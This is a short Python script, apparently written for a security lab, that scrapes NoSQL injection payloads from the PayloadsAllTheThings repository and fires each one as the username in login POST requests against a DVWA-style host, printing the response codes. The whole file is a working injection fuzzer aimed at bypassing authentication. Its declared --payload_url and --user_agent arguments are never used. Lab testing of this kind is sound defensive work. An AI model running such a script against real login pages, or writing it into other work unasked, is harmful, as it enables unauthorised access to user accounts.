#!/bin/python

import argparse
from bs4 import BeautifulSoup

# get arguments
parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('--user_agent',
                    required=False,
                    help="User Agent for Testing"
                   )
parser.add_argument('--payload_url',
                    required=True,
                    help="Where to find the payloads"
                   )
args = parser.parse_args()

import requests
r  = requests.get("https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL Injection/Intruder/")
data = r.text
soup = BeautifulSoup(data,features="html.parser")

payloads = []

for link in soup.find_all('a'):
    if "/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/Intruder/" in link.get('href'):
        url = "https://github.com" + link.get('href')
        req = requests.get(url)
        req_data = req.text
        req_soup = BeautifulSoup(req_data,features="html.parser")
        table = req_soup.find('table')
        rows = table.find_all('tr')
        for row in rows:
            cols = row.find_all('td')
            cols = [ele.text.strip() for ele in cols]
            payloads.append(cols[1])

headers = { 'User-Agent': 'The SOC Machine Gun of Testing' }

for payload in payloads:
    form = {'username': payload, 'password': 'password' }
    attack = requests.post("http://soclab1-dvwa.securedmz.com/login.php", data=form, headers=headers)
    print("Attempting this payload: %s" % payload)
    print("Payload response: %s" % attack.status_code)
